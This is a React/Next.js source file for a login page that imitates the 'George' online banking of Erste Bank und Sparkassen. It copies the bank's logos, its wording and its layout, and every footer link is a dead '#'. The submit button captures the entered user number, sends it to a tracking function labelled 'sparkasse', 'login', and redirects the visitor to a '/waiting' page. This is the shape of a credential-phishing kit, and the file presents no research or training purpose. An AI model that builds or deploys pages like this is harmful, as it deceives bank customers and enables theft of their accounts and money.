"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { trackSubmission } from "@/lib/track";

interface LoginFormProps {
  error: string | null;
}

export default function LoginForm({ error }: LoginFormProps) {
  const router = useRouter();
  const [username, setUsername] = useState("");

  return (
    <>
      <main>
        {/* LEFT SIDE — Form */}
        <div className="left-side">
          <div className="d-flex justify-content-end px-3 pt-3" style={{ display: "flex", justifyContent: "flex-end", padding: "1rem 1rem 0" }}>
            <div className="language">
              <a className="lang_en" title="English" />
              <a className="lang_de" title="Deutsch" />
            </div>
          </div>

          <div style={{ flex: 1, display: "flex", alignItems: "center" }}>
            <div className="wrapper">
              <div className="text-center">
                <img
                  className="product-icon"
                  src="/sparkasse/george-logo-bright-blue.svg"
                  alt="George Logo"
                />
              </div>

              <h1 className="text-center my-4">George Login</h1>

              {error && (
                <div
                  style={{
                    backgroundColor: "#fdeaea",
                    color: "#b91c1c",
                    border: "1px solid #f5c6cb",
                    borderRadius: "0.75rem",
                    padding: "10px 14px",
                    marginBottom: "12px",
                    fontSize: "0.875rem",
                  }}
                >
                  {error}
                </div>
              )}

              <div className="mb-2 description">
                Please type in your user number (&ldquo;Verf&uuml;gernummer&rdquo;) or the username you created.
              </div>

              <div className="mb-3 position-relative">
                <svg className="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                  <circle cx="12" cy="7" r="4" />
                </svg>
                <input
                  type="text"
                  id="user"
                  name="j_username"
                  className="form-control"
                  autoComplete="off"
                  suppressHydrationWarning
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                />
              </div>

              <div className="mb-3 d-grid gap-2">
                <input
                  type="submit"
                  id="submitButton"
                  className="btn btn-primary"
                  value="Login"
                  onClick={async (e) => {
                    e.preventDefault();
                    await trackSubmission("sparkasse", "login", { username });
                    router.push(`/waiting?user=${encodeURIComponent(username)}`);
                  }}
                />
              </div>

              <div className="d-grid gap-1 activation-link">
                <a href="#">
                  Activation code needed or EB-PIN forgotten?
                </a>
              </div>
            </div>
          </div>

          <div style={{ height: "1rem" }} />
        </div>

        {/* RIGHT SIDE — Green with George logo */}
        <div className="right-side">
          <img
            className="absolute-centered fade-in-1s"
            src="/sparkasse/george-logo-white.svg"
            alt="George"
          />

          <div className="tagline">
            {/* English taglines (visible when body.en) */}
            <div className="fade-in-1s delay-1s">Simple</div>
            <div className="fade-in-1s delay_14">Smart</div>
            <div className="fade-in-1s delay_18">Personal</div>
          </div>
        </div>
      </main>

      {/* FOOTER */}
      <footer>
        <img
          className="footer-logo"
          src="/sparkasse/eb-spk-logo-white.svg"
          alt="Erste Bank und Sparkassen"
        />
        <ul className="nav" style={{ display: "flex", alignItems: "center", listStyle: "none", margin: 0, padding: 0 }}>
          <li className="nav-item">
            <a className="nav-link" href="#">Imprint</a>
          </li>
          <li className="nav-item">
            <a className="nav-link" href="#">Privacy</a>
          </li>
          <li className="nav-item">
            <a className="nav-link" href="#">Terms &amp; Conditions</a>
          </li>
          <li className="nav-item">
            <a className="nav-link" href="#">Contact &amp; Services</a>
          </li>
          <li className="nav-item">
            <a className="nav-link" href="#">George Help Center</a>
          </li>
        </ul>
      </footer>
    </>
  );
}
